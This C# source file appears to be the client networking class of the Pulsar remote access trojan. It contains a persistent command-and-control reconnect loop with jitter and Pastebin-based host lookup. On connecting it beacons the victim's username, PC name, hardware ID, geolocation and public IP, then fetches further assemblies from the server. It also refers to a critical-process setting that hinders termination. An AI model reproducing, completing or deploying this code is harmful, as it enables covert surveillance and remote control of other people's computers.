using NAudio.CoreAudioApi;
using Pulsar.Client.Helper;
using Pulsar.Client.IO;
using Pulsar.Client.IpGeoLocation;
using Pulsar.Client.User;
using Pulsar.Common.DNS;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages;
using Pulsar.Common.Utilities;
using Pulsar.Client.Config;
using System;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Pulsar.Common.UAC;
using Pulsar.Client.Utilities;
using Pulsar.Common.Networking;

namespace Pulsar.Client.Networking
{
    public class PulsarClient : Client, IDisposable
    {
        private bool _identified;
        private bool _requestedDeferredAssemblies;
        private readonly HostsManager _hosts;
        private readonly SafeRandom _random;
        private readonly CancellationTokenSource _tokenSource;
        private readonly CancellationToken _token;
        private volatile bool _shutdownRequested;
        private bool _disposed;

        public PulsarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            _hosts = hostsManager;
            _random = new SafeRandom();
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;

            ClientState += OnClientState;
            ClientRead += OnClientRead;
            ClientFail += OnClientFail;
        }

        public void ConnectLoop()
        {
            while (!_shutdownRequested && !_token.IsCancellationRequested)
            {
                try
                {
                    if (!Connected)
                    {
                        var host = _hosts.GetNextHost();
                        if (host?.IpAddress == null)
                        {
                            var status = _hosts.GetPastebinStatus();
                            int wait = !status.IsReachable && status.SuggestedWaitTimeMs > 0
                                ? status.SuggestedWaitTimeMs
                                : Settings.RECONNECTDELAY;

                            Thread.Sleep(wait + _random.Next(250, 750));
                            continue;
                        }

                        try
                        {
                            Connect(host.IpAddress, host.Port);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine(ex.Message);
                            CrashLogger.Log("PulsarClient.ConnectLoop.Connect", ex);
                        }
                    }

                    while (Connected)
                    {
                        if (WaitForShutdownSignal(1000))
                        {
                            Disconnect();
                            return;
                        }
                    }

                    if (_shutdownRequested || _token.IsCancellationRequested)
                    {
                        Disconnect();
                        return;
                    }

                    if (WaitForShutdownSignal(Settings.RECONNECTDELAY + _random.Next(250, 750)))
                    {
                        Disconnect();
                        return;
                    }
                }
                catch (Exception ex)
                {
                    CrashLogger.Log("PulsarClient.ConnectLoop", ex);
                    Disconnect();
                    Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
                }
            }
        }

        private void OnClientRead(Client c, IMessage msg, int len)
        {
            try
            {
                if (!_identified)
                {
                    if (msg is ClientIdentificationResult r && (_identified = r.Result))
                        RequestDeferredAssemblies();
                    return;
                }

                MessageHandler.Process(c, msg);
            }
            catch (Exception ex)
            {
                CrashLogger.Log("PulsarClient.OnClientRead", ex);
            }
        }

        private void OnClientFail(Client c, Exception ex)
        {
            Debug.WriteLine(ex.Message);
            CrashLogger.Log("PulsarClient.OnClientFail", ex);
            c.Disconnect();
        }

        private void OnClientState(Client c, bool connected)
        {
            _identified = false;
            _requestedDeferredAssemblies = false;

            if (!connected) return;

            _hosts.NotifySuccessfulConnection();

            var geo = GeoInformationFactory.GetGeoInformation();
            var ua = new UserAccount();

            try
            {
                c.Send(new ClientIdentification
                {
                    Version = Settings.ReportedVersion,
                    OperatingSystem = PlatformHelper.FullName,
                    AccountType = ua.Type.ToString(),
                    Country = geo.Country,
                    CountryCode = geo.CountryCode,
                    ImageIndex = geo.ImageIndex,
                    Id = HardwareDevices.HardwareId,
                    Username = ua.UserName,
                    PcName = SystemHelper.GetPcName(),
                    Tag = Settings.TAG,
                    EncryptionKey = Settings.ENCRYPTIONKEY,
                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
                    PublicIP = geo.IpAddress ?? "Unknown"
                });
            }
            catch (Exception ex)
            {
                CrashLogger.Log("PulsarClient.OnClientState.SendIdentification", ex);
            }
        }

        private void RequestDeferredAssemblies()
        {
            if (_requestedDeferredAssemblies) return;

            var missing = DeferredAssemblyManager.GetMissingAssemblies();
            if (missing == null || missing.Length == 0) return;

            try
            {
                Send(new RequestDeferredAssemblies
                {
                    Assemblies = missing,
                    ClientVersion = Settings.ReportedVersion
                });

                _requestedDeferredAssemblies = true;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                CrashLogger.Log("PulsarClient.RequestDeferredAssemblies", ex);
            }
        }

        public void Exit()
        {
            try
            {
                if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
                    NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
            }
            catch (Exception ex)
            {
                CrashLogger.Log("PulsarClient.Exit.RtlSetProcessIsCritical", ex);
            }

            _shutdownRequested = true;
            _tokenSource.Cancel();
            Disconnect();
        }

        protected override void Dispose(bool disposing)
        {
            if (!disposing || _disposed) return;

            _disposed = true;
            _shutdownRequested = true;

            _tokenSource.Cancel();
            try
            {
                base.Dispose(disposing);
            }
            catch (Exception ex)
            {
                CrashLogger.Log("PulsarClient.Dispose.base", ex);
            }
            finally
            {
                _tokenSource.Dispose();
            }
        }

        private bool WaitForShutdownSignal(int ms)
        {
            var slice = 100;
            var waited = 0;

            while (waited < ms && !_shutdownRequested && !_token.IsCancellationRequested)
            {
                var d = Math.Min(slice, ms - waited);
                Thread.Sleep(d);
                waited += d;
            }

            return _shutdownRequested || _token.IsCancellationRequested;
        }
    }
}
